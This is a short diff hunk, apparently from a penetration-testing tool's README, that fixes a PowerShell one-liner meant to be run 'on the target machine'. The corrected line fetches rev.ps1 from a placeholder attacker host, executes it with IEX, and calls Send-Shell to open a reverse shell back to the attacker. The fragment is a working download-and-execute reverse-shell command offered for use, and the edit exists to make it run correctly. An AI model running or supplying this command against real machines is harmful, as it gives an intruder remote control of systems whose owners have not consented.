@@ -141,5 +141,5 @@ Rev.ps1 is the powershell script to connect back to us.\
 To start the reverse shell run the following code on the target machine.
 
 ```
-(New-Object System.Net.WebClient).DownloadString('http://<IP>:<PORT>/rev.ps1') IEX; Send-Shell -i <IP> -p <ShellPort>
+IEX (New-Object System.Net.WebClient).DownloadString('http://<IP>:<PORT>/rev.ps1'); Send-Shell -i <IP> -p <ShellPort>
 ```
